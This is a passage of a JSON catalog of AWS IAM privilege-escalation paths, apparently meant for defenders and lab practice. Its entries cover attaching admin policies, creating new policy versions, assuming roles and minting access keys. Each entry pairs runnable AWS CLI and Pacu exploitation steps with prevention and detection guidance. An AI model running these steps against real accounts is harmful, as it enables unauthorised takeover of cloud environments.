      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-013.yaml"
  },
  {
    "id": "iam-014",
    "name": "iam:AttachRolePolicy + sts:AssumeRole",
    "category": "lateral-movement",
    "services": [
      "iam"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:AttachRolePolicy",
          "resourceConstraints": "Must have access to attach policies to the target role"
        },
        {
          "permission": "sts:AssumeRole",
          "resourceConstraints": "Must have permission to assume the target role"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles that can be modified"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies to identify assumable roles"
        },
        {
          "permission": "iam:ListAttachedRolePolicies",
          "resourceConstraints": "Helpful for viewing current role permissions before and after modification"
        }
      ]
    },
    "description": "This is a variation of `iam:AttachRolePolicy` (iam-009). This variation is needed when you have `iam:AttachRolePolicy` permission on another role (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a different role and then assuming it. This requires both `iam:AttachRolePolicy` on the target role AND `sts:AssumeRole` permission. Critically, the target role must also be configured with a trust policy that explicitly allows your principal to assume it. You attach an administrative policy to the target role, then assume that role to gain the elevated privileges. Even if the target role initially has minimal or no privileges, this combination creates a complete privilege escalation path to administrative access.",
    "prerequisites": {
      "admin": [
        "A target role must exist that you have `iam:AttachRolePolicy` permission on",
        "You must have `sts:AssumeRole` permission scoped to the target role",
        "**Critical**: The target role must have a trust policy that explicitly allows your principal to assume it (e.g., your user or role ARN must be in the Principal element of the role's trust policy)",
        "An AWS-managed or customer-managed policy with administrative permissions must exist that you can attach (e.g., AdministratorAccess)"
      ],
      "lateral": [
        "A target role must exist that you have `iam:AttachRolePolicy` permission on",
        "You must have `sts:AssumeRole` permission scoped to the target role",
        "**Critical**: The target role must have a trust policy that explicitly allows your principal to assume it (e.g., your user or role ARN must be in the Principal element of the role's trust policy)"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "# Get account ID\nACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)\nTARGET_ROLE=\"target-role-name\"\nTARGET_ROLE_ARN=\"arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE\"\n",
          "description": "Retrieve the AWS account ID and set the target role ARN"
        },
        {
          "step": 2,
          "command": "# Attach AdministratorAccess policy to the target role\naws iam attach-role-policy \\\n  --role-name $TARGET_ROLE \\\n  --policy-arn \"arn:aws:iam::aws:policy/AdministratorAccess\"\n",
          "description": "Attach the AWS-managed AdministratorAccess policy to the target role"
        },
        {
          "step": 3,
          "command": "# Wait for IAM policy changes to propagate (15 seconds)\nsleep 15\n",
          "description": "Wait for the policy attachment to propagate across AWS infrastructure"
        },
        {
          "step": 4,
          "command": "# Verify the policy was attached\naws iam list-attached-role-policies \\\n  --role-name $TARGET_ROLE \\\n  --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \\\n  --output table\n",
          "description": "Verify that AdministratorAccess is now attached to the target role"
        },
        {
          "step": 5,
          "command": "# Assume the target role with admin permissions\nCREDENTIALS=$(aws sts assume-role \\\n  --role-arn $TARGET_ROLE_ARN \\\n  --role-session-name privesc-session \\\n  --query 'Credentials' \\\n  --output json)\n\n# Export the temporary credentials\nexport AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')\nexport AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')\n",
          "description": "Assume the target role to obtain temporary credentials with administrative permissions"
        },
        {
          "step": 6,
          "command": "# Verify administrative access\naws iam list-users --max-items 5\n",
          "description": "Verify that you now have administrative access by listing IAM users"
        }
      ]
    },
    "limitations": "This attack requires that the target role has a trust policy allowing the starting principal to assume it. The attack provides administrative access only if an admin policy (like AdministratorAccess) is attached to the role. However, the attacker could attach any AWS-managed or customer-managed policy they have visibility into, so the level of access depends on available policies.\n\nAdditionally, the starting principal must have both permissions (iam:AttachRolePolicy AND sts:AssumeRole) scoped to the same target role. If these permissions are scoped to different roles, the attack path is not viable.\n",
    "recommendation": "Restrict `iam:AttachRolePolicy` and `sts:AssumeRole` using the principle of least privilege. These permissions should rarely be granted together on the same target role.\n\n**Prevention strategies:**\n\n1. Use IAM policy conditions to restrict which policies can be attached:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:AttachRolePolicy\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:role/SpecificRole\",\n  \"Condition\": {\n    \"ArnNotEquals\": {\n      \"iam:PolicyARN\": [\n        \"arn:aws:iam::aws:policy/AdministratorAccess\",\n        \"arn:aws:iam::aws:policy/PowerUserAccess\"\n      ]\n    }\n  }\n}\n```\n\n2. Implement Service Control Policies (SCPs) to prevent attachment of highly privileged managed policies\n\n3. Use IAM permissions boundaries to limit the maximum permissions a role can have, even if admin policies are attached\n\n4. Separate the permissions - avoid granting both `iam:AttachRolePolicy` and `sts:AssumeRole` to the same principal for the same role\n\n5. Require MFA for both policy attachment operations and role assumption\n\n**Detection strategies:**\n\nMonitor CloudTrail for the following event patterns:\n- `AttachRolePolicy` API calls, especially when followed by `AssumeRole` on the same resource within a short time window\n- Attachment of AWS-managed policies like `AdministratorAccess` or `PowerUserAccess` to roles\n- Role assumption events (`AssumeRole`) that follow policy modification events\n\nSet up CloudWatch alarms for unexpected changes to role policies and investigate any modifications to role permissions.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS IAM Privilege Escalation Methods",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "Pathfinder Labs - IAM AttachRolePolicy + AssumeRole Scenario",
        "url": "https://github.com/WithSecureLabs/pathfinder-labs"
      }
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L148",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L553",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L85"
    },
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-attachrolepolicy+sts-assumerole",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-AttachRolePolicy",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/lessons/lab-ctf-iamattachrolepolicy-privesc/",
        "scenarioPricingModel": "paid"
      }
    },
    "relatedPaths": [
      "iam-001",
      "iam-002",
      "iam-003"
    ],
    "detectionRules": [
      {
        "platform": "CloudSIEM",
        "ruleId": "TBD",
        "url": "https://docs.datadoghq.com/security/default_rules/"
      }
    ],
    "toolSupport": {
      "pmapper": true,
      "iamVulnerable": false,
      "pacu": false,
      "prowler": true
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal initiating the attack. Can be an IAM user or role with both `iam:AttachRolePolicy` and `sts:AssumeRole` permissions on the target role.\n\nThis principal may have minimal or no administrative permissions initially, but the combination of these two permissions creates a complete privilege escalation path.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Target Role",
          "type": "resource",
          "description": "The IAM role being modified and assumed. Must have a trust policy that allows the starting principal to assume it.\n\nInitially, this role may have minimal or no privileges. The attacker will attach the AdministratorAccess policy to it.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "Full administrative access to the AWS account. The attacker achieves this by:\n1. Attaching AdministratorAccess policy to the target role\n2. Assuming the target role to obtain temporary credentials\n3. Using those credentials to perform administrative actions\n\nThis is a deterministic outcome since the attacker controls which policy to attach to the role.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_role",
          "label": "iam:AttachRolePolicy (AdministratorAccess)",
          "description": "The attacker uses `iam:AttachRolePolicy` to attach the AWS-managed AdministratorAccess policy to the target role.\n\nCommand:\n```bash\naws iam attach-role-policy \\\n  --role-name target-role-name \\\n  --policy-arn \"arn:aws:iam::aws:policy/AdministratorAccess\"\n```\n\nAfter this action, the target role has administrative permissions. The attacker must wait approximately 15 seconds for the IAM policy changes to propagate across AWS infrastructure.\n"
        },
        {
          "from": "target_role",
          "to": "admin",
          "label": "sts:AssumeRole",
          "description": "The attacker uses `sts:AssumeRole` to assume the now-privileged target role and obtain temporary credentials.\n\nCommand:\n```bash\nCREDENTIALS=$(aws sts assume-role \\\n  --role-arn \"arn:aws:iam::ACCOUNT_ID:role/target-role-name\" \\\n  --role-session-name privesc-session \\\n  --query 'Credentials' \\\n  --output json)\n\nexport AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')\nexport AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')\nexport AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')\n```\n\nThese temporary credentials have full administrative permissions and can be used to perform any action in the AWS account.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-05T19:56:13Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-014.yaml"
  },
  {
    "id": "iam-015",
    "name": "iam:AttachUserPolicy + iam:CreateAccessKey",
    "category": "lateral-movement",
    "services": [
      "iam"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:AttachUserPolicy",
          "resourceConstraints": "Must have access to attach policies to the target user"
        },
        {
          "permission": "iam:CreateAccessKey",
          "resourceConstraints": "Must have permission to create access keys for the target user"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListUsers",
          "resourceConstraints": "Helpful for discovering available users to target"
        },
        {
          "permission": "iam:GetUser",
          "resourceConstraints": "Useful for retrieving target user details and verifying existence"
        },
        {
          "permission": "iam:ListAttachedUserPolicies",
          "resourceConstraints": "Helpful for viewing current user permissions before and after modification"
        },
        {
          "permission": "iam:ListAccessKeys",
          "resourceConstraints": "Useful for checking the number of existing access keys (AWS limit is 2 per user)"
        },
        {
          "permission": "iam:ListPolicies",
          "resourceConstraints": "Helpful for discovering AWS-managed policies available to attach"
        }
      ]
    },
    "description": "This is a variation of `iam:AttachUserPolicy` (iam-008). This variation is needed when you have `iam:AttachUserPolicy` permission on another user (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a different user and then authenticating as that user. Since the target is a user (not a role), you need `iam:CreateAccessKey` to create credentials for authentication, rather than using `sts:AssumeRole`. You attach an administrative policy (such as AdministratorAccess) to the target user, create new access keys for that user, and then authenticate using those credentials to gain the elevated privileges. The target user may initially have minimal or no permissions, but you control which policy is attached, making administrative access a deterministic outcome.",
    "prerequisites": {
      "admin": [
        "A target IAM user must exist that you have `iam:AttachUserPolicy` permission on",
        "You must have `iam:CreateAccessKey` permission scoped to the target user",
        "The target user must have fewer than 2 access keys (AWS enforces a limit of 2 access keys per IAM user)",
        "An AWS-managed or customer-managed policy with administrative permissions must exist that you can attach (e.g., AdministratorAccess)"
      ],
      "lateral": [
        "A target IAM user must exist that you have `iam:AttachUserPolicy` permission on",
        "You must have `iam:CreateAccessKey` permission scoped to the target user",
        "The target user must have fewer than 2 access keys (AWS enforces a limit of 2 access keys per IAM user)"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "# Set the target user name\nTARGET_USER=\"target-user-name\"\n",
          "description": "Define the target user that will be modified and compromised"
        },
        {
          "step": 2,
          "command": "# List existing access keys for the target user\naws iam list-access-keys --user-name $TARGET_USER\n",
          "description": "Verify that the target user has fewer than 2 access keys (AWS limit). If the user already has 2 keys, you must delete one first using iam:DeleteAccessKey permission."
        },
        {
          "step": 3,
          "command": "# Attach AdministratorAccess policy to the target user\naws iam attach-user-policy \\\n  --user-name $TARGET_USER \\\n  --policy-arn \"arn:aws:iam::aws:policy/AdministratorAccess\"\n",
          "description": "Attach the AWS-managed AdministratorAccess policy to the target user"
        },
        {
          "step": 4,
          "command": "# Wait for IAM policy changes to propagate (15 seconds)\nsleep 15\n",
          "description": "Wait for the policy attachment to propagate across AWS infrastructure"
        },
        {
          "step": 5,
          "command": "# Verify the policy was attached\naws iam list-attached-user-policies \\\n  --user-name $TARGET_USER \\\n  --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \\\n  --output table\n",
          "description": "Verify that AdministratorAccess is now attached to the target user"
        },
        {
          "step": 6,
          "command": "# Create new access keys for the target user\nCREDENTIALS=$(aws iam create-access-key \\\n  --user-name $TARGET_USER \\\n  --output json)\n\n# Extract the credentials\nNEW_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKey.AccessKeyId')\nNEW_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.AccessKey.SecretAccessKey')\n\necho \"New Access Key ID: $NEW_ACCESS_KEY_ID\"\necho \"New Secret Access Key: $NEW_SECRET_ACCESS_KEY\"\n",
          "description": "Create new access keys for the target user and extract the credentials"
        },
        {
          "step": 7,
          "command": "# Configure a new AWS CLI profile with the stolen credentials\naws configure set aws_access_key_id $NEW_ACCESS_KEY_ID --profile compromised-user\naws configure set aws_secret_access_key $NEW_SECRET_ACCESS_KEY --profile compromised-user\naws configure set region us-east-1 --profile compromised-user\n",
          "description": "Configure a new AWS CLI profile using the newly created access keys"
        },
        {
          "step": 8,
          "command": "# Verify administrative access using the new credentials\naws iam list-users --max-items 5 --profile compromised-user\n",
          "description": "Verify that you now have administrative access by listing IAM users with the compromised credentials"
        }
      ],
      "pacu": [
        {
          "step": 1,
          "command": "# Use Pacu to attach AdministratorAccess to the target user\nrun iam__attach_user_policy --user-name target-user-name --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n",
          "description": "Use Pacu to attach the AdministratorAccess policy to the target user"
        },
        {
          "step": 2,
          "command": "# Use Pacu to create access keys for the target user\nrun iam__create_access_key --user-name target-user-name\n",
          "description": "Use Pacu to create new access keys for the target user and save them for authentication"
        },
        {
          "step": 3,
          "command": "# Switch to the newly created credentials\nswap_keys\n",
          "description": "Configure Pacu to use the newly created access keys for the target user"
        }
      ]
    },
    "limitations": "This attack requires that the starting principal has both permissions (iam:AttachUserPolicy AND iam:CreateAccessKey) scoped to the same target user. If these permissions are scoped to different users, the attack path is not viable.\n\nAdditionally, the target user must have fewer than 2 access keys due to AWS's hard limit. If the user already has 2 keys, the attacker would need an additional permission (iam:DeleteAccessKey) to remove an existing key before creating a new one.\n\nThe attack provides administrative access only if an admin policy (like AdministratorAccess) is attached to the user. However, the attacker could attach any AWS-managed or customer-managed policy they have visibility into, so the level of access depends on available policies.\n",
    "recommendation": "Restrict `iam:AttachUserPolicy` and `iam:CreateAccessKey` using the principle of least privilege. These permissions should rarely be granted together on the same target user, as this combination creates a direct privilege escalation path.\n\n**Prevention strategies:**\n\n1. Use IAM policy conditions to restrict which policies can be attached:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:AttachUserPolicy\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:user/SpecificUser\",\n  \"Condition\": {\n    \"ArnNotEquals\": {\n      \"iam:PolicyARN\": [\n        \"arn:aws:iam::aws:policy/AdministratorAccess\",\n        \"arn:aws:iam::aws:policy/IAMFullAccess\"\n      ]\n    }\n  }\n}\n```\n\n2. Restrict `iam:CreateAccessKey` to prevent cross-user access key creation:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:CreateAccessKey\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT:user/${aws:username}\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:UserName\": \"${aws:username}\"\n    }\n  }\n}\n```\n\n3. Implement Service Control Policies (SCPs) to prevent attachment of highly privileged managed policies\n\n4. Use IAM permissions boundaries to limit the maximum permissions a user can have, even if admin policies are attached\n\n5. Separate the permissions - avoid granting both `iam:AttachUserPolicy` and `iam:CreateAccessKey` to the same principal for other users\n\n6. Require MFA for sensitive policy attachment operations and access key creation\n\n**Detection strategies:**\n\nMonitor CloudTrail for the following event patterns:\n- `AttachUserPolicy` API calls where the calling principal differs from the target user, especially when administrative policies are attached\n- `CreateAccessKey` API calls where the calling principal differs from the target user\n- Sequential occurrences of `AttachUserPolicy` followed by `CreateAccessKey` on the same user within a short time window\n- Attachment of AWS-managed policies like `AdministratorAccess` or `IAMFullAccess` to users\n- Access key creation events that follow policy modification events\n\nSet up CloudWatch alarms for unexpected changes to user policies and creation of access keys by non-self principals. Investigate any modifications to user permissions combined with access key creation.\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2018"
    },
    "references": [
      {
        "title": "AWS IAM Privilege Escalation \u2013 Methods and Mitigation",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "AWS IAM Privilege Escalation Methods (GitHub Repository)",
        "url": "https://github.com/RhinoSecurityLabs/AWS-IAM-Privilege-Escalation"
      },
      {
        "title": "AWS IAM Privilege Escalation Techniques - Hacking The Cloud",
        "url": "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
      },
      {
        "title": "Investigating Privilege Escalation Methods in AWS (Bishop Fox)",
        "url": "https://bishopfox.com/blog/privilege-escalation-in-aws"
      },
      {
        "title": "IAM Vulnerable - AWS IAM Privilege Escalation Playground",
        "url": "https://github.com/BishopFox/iam-vulnerable"
      }
    ],
    "relatedPaths": [
      "iam-001",
      "iam-002",
      "iam-003",
      "iam-014"
    ],
    "detectionTools": {
      "cloudsplaining": "https://github.com/salesforce/cloudsplaining/blob/master/cloudsplaining/shared/constants.py#L109-L117",
      "pacu": "https://github.com/RhinoSecurityLabs/pacu/blob/master/pacu/modules/iam__privesc_scan/main.py#L455-L462",
      "prowler": "https://github.com/prowler-cloud/prowler/blob/master/prowler/providers/aws/services/iam/lib/privilege_escalation.py#L100-L107"
    },
    "detectionRules": [
      {
        "platform": "CloudSIEM",
        "ruleId": "TBD",
        "url": "https://docs.datadoghq.com/security/default_rules/"
      }
    ],
    "learningEnvironments": {
      "pathfinder-labs": {
        "type": "open-source",
        "githubLink": "https://github.com/DataDog/pathfinder-labs",
        "scenario": "privesc-one-hop/to-admin/iam-attachuserpolicy+iam-createaccesskey",
        "description": "Deploy Terraform into your own AWS account to practice this attack path"
      },
      "iam-vulnerable": {
        "type": "open-source",
        "githubLink": "https://github.com/BishopFox/iam-vulnerable",
        "scenario": "IAM-AttachUserPolicy (privesc7) and IAM-CreateAccessKey (privesc4)",
        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal initiating the attack. Can be an IAM user or role with both `iam:AttachUserPolicy` and `iam:CreateAccessKey` permissions on the target user.\n\nThis principal may have minimal or no administrative permissions initially, but the combination of these two permissions creates a complete privilege escalation path.\n"
        },
        {
          "id": "target_user",
          "label": "Existing target-user",
          "type": "resource",
          "description": "The IAM user being modified and compromised. Must be a valid IAM user with fewer than 2 existing access keys.\n\nInitially, this user may have minimal or no privileges. The attacker will attach the AdministratorAccess policy to it and create new access keys for authentication.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "Full administrative access to the AWS account. The attacker achieves this by:\n1. Attaching AdministratorAccess policy to the target user\n2. Creating new access keys for the target user\n3. Authenticating with those credentials to perform administrative actions\n\nThis is a deterministic outcome since the attacker controls which policy to attach to the user.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_user",
          "label": "iam:AttachUserPolicy (AdministratorAccess)",
          "description": "The attacker uses `iam:AttachUserPolicy` to attach the AWS-managed AdministratorAccess policy to the target user.\n\nCommand:\n```bash\naws iam attach-user-policy \\\n  --user-name target-user-name \\\n  --policy-arn \"arn:aws:iam::aws:policy/AdministratorAccess\"\n```\n\nAfter this action, the target user has administrative permissions. The attacker must wait approximately 15 seconds for the IAM policy changes to propagate across AWS infrastructure.\n"
        },
        {
          "from": "target_user",
          "to": "admin",
          "label": "iam:CreateAccessKey + Authenticate",
          "description": "The attacker uses `iam:CreateAccessKey` to create new access keys for the now-privileged target user, then authenticates using those credentials.\n\nCommands:\n```bash\n# Create access keys\nCREDENTIALS=$(aws iam create-access-key \\\n  --user-name target-user-name \\\n  --output json)\n\nNEW_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKey.AccessKeyId')\nNEW_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.AccessKey.SecretAccessKey')\n\n# Configure profile with new credentials\naws configure set aws_access_key_id $NEW_ACCESS_KEY_ID --profile compromised\naws configure set aws_secret_access_key $NEW_SECRET_ACCESS_KEY --profile compromised\n\n# Use the compromised credentials\naws iam list-users --profile compromised\n```\n\nThese new access keys have full administrative permissions and can be used to perform any action in the AWS account. Unlike temporary credentials from AssumeRole, these access keys do not expire and remain valid until explicitly deactivated or deleted.\n"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-11-07T04:00:34Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/iam/iam-015.yaml"
  },
  {
    "id": "iam-016",
    "name": "iam:CreatePolicyVersion + sts:AssumeRole",
    "category": "lateral-movement",
    "services": [
      "iam",
      "sts"
    ],
    "permissions": {
      "required": [
        {
          "permission": "iam:CreatePolicyVersion",
          "resourceConstraints": "Customer-managed policy ARN must be in the Resource section and the policy must be attached to a role that the attacker can assume"
        },
        {
          "permission": "sts:AssumeRole",
          "resourceConstraints": "Target role ARN must be in the Resource section and the role's trust policy must allow the principal to assume it"
        }
      ],
      "additional": [
        {
          "permission": "iam:GetPolicy",
          "resourceConstraints": "Helpful for getting policy ARN and current version information"
        },
        {
          "permission": "iam:GetPolicyVersion",
          "resourceConstraints": "Useful for viewing current policy document and version details"
        },
        {
          "permission": "iam:ListPolicyVersions",
          "resourceConstraints": "Helpful for listing all policy versions to verify new version creation"
        },
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Useful for discovering roles that have the target policy attached"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Helpful for viewing role details, attached policies, and trust policies"
        }
      ]
    },
    "description": "This is a variation of `iam:CreatePolicyVersion` (iam-001). This variation is needed when you have `iam:CreatePolicyVersion` permission on a customer-managed policy that is attached to another role (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a policy attached to a different role and then assuming that role. This requires both `iam:CreatePolicyVersion` on a customer-managed policy AND `sts:AssumeRole` permission on a role that has that policy attached. Critically, the target role must also be configured with a trust policy that explicitly allows your principal to assume it. You create a new policy version with administrative permissions (setting it as default), then assume the role that has this policy attached to gain the elevated privileges. This exploits AWS's policy versioning feature where new versions take effect immediately for all principals that have the policy attached.",
    "prerequisites": {
      "admin": [
        "A customer-managed policy must exist that is attached to a target role",
        "You must have `iam:CreatePolicyVersion` permission on that customer-managed policy",
        "You must have `sts:AssumeRole` permission scoped to the target role",
        "**Critical**: The target role must have a trust policy that explicitly allows your principal to assume it (e.g., your user or role ARN must be in the Principal element of the role's trust policy)"
      ],
      "lateral": [
        "A customer-managed policy must exist that is attached to a target role",
        "You must have `iam:CreatePolicyVersion` permission on that customer-managed policy",
        "You must have `sts:AssumeRole` permission scoped to the target role",
        "**Critical**: The target role must have a trust policy that explicitly allows your principal to assume it (e.g., your user or role ARN must be in the Principal element of the role's trust policy)"
      ]
    },
    "exploitationSteps": {
      "awscli": [
        {
          "step": 1,
          "command": "aws sts get-caller-identity",
          "description": "Verify current identity before privilege escalation"
        },
        {
          "step": 2,
          "command": "aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table",
          "description": "List available roles to find targets with the customer-managed policy attached (optional but helpful for discovery)"
        },
        {
          "step": 3,
          "command": "aws iam get-policy --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY",
          "description": "Get the target customer-managed policy information to verify it exists and check current version"
        },
        {
          "step": 4,
          "command": "aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY --version-id v1",
          "description": "View the current policy document to understand existing permissions (optional)"
        },
        {
          "step": 5,
          "command": "aws iam create-policy-version \\\n  --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY \\\n  --policy-document file://admin_policy.json \\\n  --set-as-default\n",
          "description": "Create a new policy version with administrative permissions and set it as default. The policy immediately takes effect for all principals that have it attached."
        },
        {
          "step": 6,
          "command": "sleep 15",
          "description": "Wait briefly for the policy changes to propagate across AWS (typically takes a few seconds)"
        },
        {
          "step": 7,
          "command": "aws iam list-policy-versions --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY",
          "description": "Verify the new policy version was created and is set as default (optional)"
        },
        {
          "step": 8,
          "command": "aws sts assume-role \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \\\n  --role-session-name privesc-session\n",
          "description": "Assume the target role to obtain temporary credentials with the newly elevated permissions"
        },
        {
          "step": 9,
          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 8>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 8>\nexport AWS_SESSION_TOKEN=<SessionToken from step 8>\n",
          "description": "Configure the AWS CLI to use the assumed role credentials"
        },
        {
          "step": 10,
          "command": "aws sts get-caller-identity",
          "description": "Verify the assumed role identity"
        },
        {
          "step": 11,
          "command": "aws iam list-users --max-items 3",
          "description": "Verify administrative access was successfully obtained"
        }
      ],
      "pacu": [
        {
          "step": 1,
          "command": "run iam__enum_permissions",
          "description": "Enumerate IAM permissions and identify roles with customer-managed policies attached"
        },
        {
          "step": 2,
          "command": "run iam__privesc_scan",
          "description": "Scan for IAM privilege escalation opportunities including CreatePolicyVersion + AssumeRole combinations"
        },
        {
          "step": 3,
          "command": "run iam__create_policy_version --policy-arn arn:aws:iam::ACCOUNT_ID:policy/TARGET_POLICY --policy-file admin_policy.json",
          "description": "Use Pacu to create a new policy version with admin permissions"
        },
        {
          "step": 4,
          "command": "run iam__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE",
          "description": "Assume the privileged role using Pacu"
        }
      ]
    },
    "limitations": "This path provides administrative access only if the new policy version includes administrative permissions (e.g., AdministratorAccess equivalent). The attacker gains whatever permissions are specified in the new policy version they create. However, even limited additional permissions may enable multi-hop attacks or data access.\n",
    "recommendation": "This attack path requires multiple controls to prevent effectively:\n\n**1. Restrict `iam:CreatePolicyVersion` permission:**\n- Very few principals need this permission. Restrict it to only authorized IAM administrators.\n- Use resource-level restrictions to limit which policies can be modified:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:CreatePolicyVersion\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:policy/AllowedPolicy*\"\n}\n```\n\n**2. Restrict `sts:AssumeRole` permission:**\n- Carefully audit IAM role trust policies to ensure they follow the principle of least privilege.\n- Only allow trusted principals to assume sensitive roles.\n- Consider requiring MFA for sensitive role assumptions:\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Principal\": {\"AWS\": \"arn:aws:iam::ACCOUNT_ID:user/TrustedUser\"},\n  \"Action\": \"sts:AssumeRole\",\n  \"Condition\": {\"Bool\": {\"aws:MultiFactorAuthPresent\": \"true\"}}\n}\n```\n\n**3. Monitoring and Detection:**\n- Alert on `CreatePolicyVersion` events in CloudTrail, especially with `--set-as-default` flag\n- Monitor for `AssumeRole` events on privileged roles, especially shortly after policy version changes\n- Use AWS Config rules to detect roles with administrative permissions that can be assumed by users\n- Implement anomaly detection for unusual assume-role patterns or assumptions from unexpected IP addresses\n\n**4. Additional Controls:**\n- Use IAM Access Analyzer to regularly audit role trust policies for overly permissive trust relationships\n- Implement service control policies (SCPs) to restrict policy version creation at the organizational level\n- Consider using permission boundaries to limit the maximum permissions that can be granted through policy modifications\n",
    "discoveredBy": {
      "name": "Spencer Gietzen",
      "organization": "Rhino Security Labs",
      "date": "2019"
    },
    "references": [
      {
        "title": "AWS IAM Privilege Escalation Methods",
        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
      },
      {
        "title": "AWS IAM Privilege Escalation Techniques - Hacking the Cloud",
        "url": "https://hackingthe.cloud/aws/exploitation/iam_privilege_escalation/"
      },
      {
        "title": "Investigating Privilege Escalation Methods in AWS",
        "url": "https://bishopfox.com/blog/privilege-escalation-in-aws"
      }
    ],
    "relatedPaths": [
      "iam-001",
      "iam-007",
      "iam-008",
